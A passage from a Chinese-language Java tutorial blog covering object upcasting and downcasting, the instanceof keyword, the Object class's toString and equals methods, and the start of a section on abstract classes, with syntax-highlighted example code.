(子类)父类实例、强制完成转换。</p><p>​    在实际的转型处理来讲，大部分情况下考虑最多的一定是对象的向上转型、对象的向下转型是在特殊功能（子类可以对父类进行功能扩充）的时候，还有一些时候是不会考虑转型的（String类）。</p><h5 id="对象向上转型"><a href="#对象向上转型" class="headerlink" title="对象向上转型"></a>对象向上转型</h5><p>​    对象转型的处理属于多态性，而这一特性必须在继承性的基础上实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Message</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DataBaseMessage</span> <span class="keyword">extends</span> <span class="title class_">Message</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;mes9s0数据库链接信息&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test15</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">DataBaseMessage</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataBaseMessage</span>();</span><br><span class="line">        msg.print();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    本程序是一个最简单的方法覆写操作实现，整体的程序之中可以发现，由于现在实例化的是子类对象，并且子类对象覆写了父类中的print方法，所以调用的是覆写的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Message</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;mes9s0&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DataBaseMessage</span> <span class="keyword">extends</span> <span class="title class_">Message</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;mes9s0数据库链接信息&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WebServerMessage</span> <span class="keyword">extends</span> <span class="title class_">Message</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;mes9s0web服务器信息&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test15</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        fun(<span class="keyword">new</span> <span class="title class_">DataBaseMessage</span>());</span><br><span class="line">      <span class="comment">//Message msg = new DataBaseMessage()</span></span><br><span class="line">        fun(<span class="keyword">new</span> <span class="title class_">WebServerMessage</span>());</span><br><span class="line">      <span class="comment">// Message msg = new WebServerMessage()</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">fun</span><span class="params">(Message msg)</span>&#123;</span><br><span class="line">      <span class="comment">//不管传递的是哪个子类，都可以用一个参数接收</span></span><br><span class="line">        msg.print();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​    向上转型的主要特点在于，可以对参数进行统一的设计。为什么不用重载来实现，因为除了对程序类设计的时候，除了对当前的要求之外，还需要做出可以维护性的设计，如果说现在随着项目的发展，产生了很多很多的子类，每次添加之后都需要对message之后追加一个fun()的方法重载，这样就对程序的维护有很大影响。</p><p>​    向上转型实现的就是接受参数的统一性。</p><h5 id="对象向下转型"><a href="#对象向下转型" class="headerlink" title="对象向下转型"></a>对象向下转型</h5><p>​    向下转型主要特点在于需要使用到一些子类自己特殊的定义处理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person6</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;一个人的正常的人类行为，吃饭，睡觉&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SuperMan</span> <span class="keyword">extends</span> <span class="title class_">Person6</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">fly</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我可以飞&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">fire</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我可以喷火&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test16</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;----------正常状态下的超人是一个普通人&quot;</span>);</span><br><span class="line">        <span class="type">Person6</span> <span class="variable">person6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SuperMan</span>();<span class="comment">//向上转型</span></span><br><span class="line">        person6.print();</span><br><span class="line">        System.out.println(<span class="string">&quot;----------外星人进攻地球&quot;</span>);</span><br><span class="line">        <span class="type">SuperMan</span> <span class="variable">man</span> <span class="operator">=</span> (SuperMan) person6;<span class="comment">//向下转型</span></span><br><span class="line">        System.out.println(man.fly());</span><br><span class="line">        System.out.println(man.fire());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    向上描述的是一些公共的特征，而向下描述的是子类自己特殊的定义环境，但是需要明确的是，<strong>向下转型不是一个安全的事情。因为在向下转型之前一定要发生向上转型。</strong></p><h5 id="Instanceof关键字"><a href="#Instanceof关键字" class="headerlink" title="Instanceof关键字"></a>Instanceof关键字</h5><p>​    通过分析可以发现向下转型本身是一件存在有安全隐患的操作，所以为了保证向下转型的正确性，我们往往在进行转型前，需要判断某个实例是否是某个类的对象，这个就需要通过instanceof语法</p><p>​    instanceof判断将返回一个boolean类型，如果是true表示实例是指定类对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person7</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;一个人的正常的人类行为，吃饭，睡觉&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SuperMan1</span> <span class="keyword">extends</span> <span class="title class_">Person7</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">fly</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我可以飞&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">fire</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我可以喷火&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test17</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person7</span> <span class="variable">per</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person7</span>(); <span class="comment">//不转型</span></span><br><span class="line">        System.out.println(per <span class="keyword">instanceof</span> Person7);<span class="comment">//true</span></span><br><span class="line">        System.out.println(per <span class="keyword">instanceof</span> SuperMan1);<span class="comment">//false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person7</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;一个人的正常的人类行为，吃饭，睡觉&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SuperMan1</span> <span class="keyword">extends</span> <span class="title class_">Person7</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">fly</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我可以飞&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">fire</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我可以喷火&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test17</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person7</span> <span class="variable">per</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SuperMan1</span>(); <span class="comment">//不转型</span></span><br><span class="line">        System.out.println(per <span class="keyword">instanceof</span> Person7);<span class="comment">//true</span></span><br><span class="line">        System.out.println(per <span class="keyword">instanceof</span> SuperMan1);<span class="comment">//true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    开发过程中，对于转型之前最好用instanceof进行判断。</p><hr><h4 id="Object类"><a href="#Object类" class="headerlink" title="Object类"></a>Object类</h4><h5 id="Object类的基本概念"><a href="#Object类的基本概念" class="headerlink" title="Object类的基本概念"></a>Object类的基本概念</h5><p>​    Object类的主要特点是可以解决参数的统一问题，也就是说使用object类可以接受所有的数据类型。</p><p>​    在java中，只有一个类不存在继承关系，就是object类。所有的类都是object类的子类。比如说：class test{}和class test extends object{}是同一个类。</p><p>​    在object类设计的时候考虑到所有的继承的问题，所以该类提供有无参构造方法，这样所有的类在定义时即便不知道也不会出现调用错误的情况。</p><p>​    既然object类是所有类的父类，那么我们可以使用object类接收所有的子类对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person8</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test18</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person8</span>();<span class="comment">//向上转型</span></span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Person8)&#123;</span><br><span class="line">            <span class="type">Person8</span> <span class="variable">per</span> <span class="operator">=</span> (Person8) obj;</span><br><span class="line">            System.out.println(<span class="string">&quot;Person对象向下转型完毕&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    如果一个程序的方法要求可以接收所有类对象的时候就可以利用object来实现。需要注意的是，在java设计过程之中，对于所有的引用数据类型实际上都可以用object进行接收，包括数组也可以。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person8</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test18</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;<span class="comment">//向上转型</span></span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> <span class="type">int</span>[]) &#123;</span><br><span class="line">            <span class="type">int</span> data[] = (<span class="type">int</span>[]) obj;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> temp : data) &#123;</span><br><span class="line">                System.out.println(temp + <span class="string">&quot;、&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="获取对象信息"><a href="#获取对象信息" class="headerlink" title="获取对象信息"></a>获取对象信息</h5><p>​    object虽然是一个类，但是这个类本身也是提供一些处理方法的，在object类之中提供有tostring方法，可以获得一个对象的完整信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person9</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test19</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person9</span> <span class="variable">per</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person9</span>();</span><br><span class="line">        System.out.println(per);</span><br><span class="line">        System.out.println(per.toString());<span class="comment">//object类继承而来</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073532.jpg"                      alt="image-20220620163236396"                >    </p><p>​    可以发现在之前进行对象直接输出的时候所调用的方法就是toString方法，所以这个方法调用不调用是一样的。所以以后对象信息的获取可以覆写此方法。</p><h5 id="对象比较"><a href="#对象比较" class="headerlink" title="对象比较"></a>对象比较</h5><p>​    object类之中另外一个比较重要的方法就是在于对象比较的处理上，所谓的对象比较主要的功能是比较两个对象的内容是否相同。</p><p>​    最基础的对象比较实现方法，此时确实实现了对象比较，但非常麻烦。由于需要进行属性比较的时候都要进行一个相等的判断，所以要大量的get方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person9</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person9</span><span class="params">(String name,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;姓名：&quot;</span>+<span class="built_in">this</span>.name+<span class="string">&quot;、年龄：&quot;</span>+<span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test19</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person9</span> <span class="variable">perA</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person9</span>(<span class="string">&quot;张三&quot;</span>,<span class="number">20</span>);</span><br><span class="line">        <span class="type">Person9</span> <span class="variable">perB</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person9</span>(<span class="string">&quot;张三&quot;</span>,<span class="number">20</span>);</span><br><span class="line">        <span class="keyword">if</span> (perA.getName().equals(perB.getName()) &amp;&amp; perA.getAge() == perB.getAge())&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;是同一个对象&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;不是同一个对象&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    对象比较应该是一个类内部所具备的功能，而不是外部，object类提供了对象比较操作的支持，对于对象比较的操作实现可以使用equals()方法完成,默认情况下下只是完成了两个对象的地址判断：    </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span>&#123;</span><br><span class="line"><span class="keyword">return</span>(<span class="built_in">this</span> == obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    也就是对于使用来说，需要覆写：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//tostring</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person9</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person9</span><span class="params">(String name,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;姓名：&quot;</span>+<span class="built_in">this</span>.name+<span class="string">&quot;、年龄：&quot;</span>+<span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!(obj <span class="keyword">instanceof</span> Person9))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (obj == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span> == obj)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Person9</span> <span class="variable">per</span> <span class="operator">=</span> (Person9) obj;<span class="comment">//为了获取类中的属性</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name.equals(per.name) &amp;&amp; <span class="built_in">this</span>.age == per.age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test19</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person9</span> <span class="variable">perA</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person9</span>(<span class="string">&quot;张三&quot;</span>,<span class="number">20</span>);</span><br><span class="line">        <span class="type">Person9</span> <span class="variable">perB</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person9</span>(<span class="string">&quot;张三&quot;</span>,<span class="number">20</span>);</span><br><span class="line">        System.out.println(perA.equals(<span class="string">&quot;狗&quot;</span>));<span class="comment">//返回false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    String类作为objectd的子类，这个类里面已经覆写了equals方法。</p><hr><h4 id="抽象类的定义与使用"><a href="#抽象类的定义与使用" class="headerlink" title="抽象类的定义与使用"></a>抽象类的定义与使用</h4><p>​    类继承的主要作用在于扩充已有类的功能，但是对于之前的继承操作而言会发现，子类可以由自己的选择任意来决定是否要覆写某一个方法，这个时候父类无法对子类作出强制性约定（强制性必须覆写某一个方法），这种情况下很少用继承（在实际开发中很少会出现继承一个已经完善的类，完善的类指的是可以直接使用的类）而是必须继承抽象类，在以后进行父类设计的时候优先考虑的一定是抽象类。</p><h5 id="抽象类基本概念"><a href="#抽象类基本概念" class="headerlink" title="抽象类基本概念"></a>抽象类基本概念</h5><p>​    抽象类的主要作用是对子类中覆写方法进行约定，在抽象类里面可以去定义一些抽象方法以实现这样的约定。抽象方法指的是使用了abstract关键字定义的并且没有提供方法体的方法，而抽象方法所以的类必须是抽象类，必须用abstract关键字进行定义（在普通类的基础上追加抽象方法就是抽象类）。</p><p>​    当一个抽象类定义完成之后（切记：“抽象类不是完整的类”），如果要去使用抽象类，必须要一下几点。</p><p>​    1、抽象类必须提供子类，子类使用extends继承一个抽象类。</p><p>​    2、抽象类的子类（不是抽象类）一定要覆写抽象类中的全部抽象方法。</p><p>​    3、抽象类的对象实例化可以利用对象多态性通过子类向上转型的方式完成。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Message1</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String type;<span class="comment">//消息类型</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title function_">getConnectInfo</span><span class="params">()</span>;<span class="comment">//抽象方法</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setType</span><span class="params">(String type)</span> &#123;<span class="comment">//普通方法</span></span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getType</span><span class="params">()</span>&#123;<span class="comment">//普通方法</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.type;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DatabaseMessage1</span> <span class="keyword">extends</span> <span class="title class_">Message1</span>&#123;</span><br><span 